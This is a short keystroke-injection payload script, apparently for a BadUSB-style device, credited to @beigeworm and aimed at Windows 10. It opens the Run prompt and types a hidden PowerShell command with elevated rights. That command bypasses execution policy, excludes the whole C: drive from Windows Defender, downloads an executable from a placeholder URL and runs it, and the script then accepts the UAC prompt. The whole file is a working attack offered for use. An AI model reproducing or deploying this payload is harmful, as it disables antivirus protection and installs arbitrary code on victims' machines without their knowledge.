// Title: Download-Execute from Run Prompt
// Author: @beigeworm | https://github.com/beigeworm
// Description: Uses the Run Prompt to download a file and run it.
// Target: Windows 10
// *SETUP*
// replace FILE_URL_HERE with the url of your file to run.

// Open Powershell as Admin
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C cd $env:Temp;Add-MpPreference -ExclusionPath C:/;Start-Sleep 1;iwr -Uri FILE_URL_HERE -O upl.exe;Start-Sleep 1;Start upl.exe;exit");
delay(500);
press("CONTROL SHIFT ENTER");
delay(3000);
press("ALT y");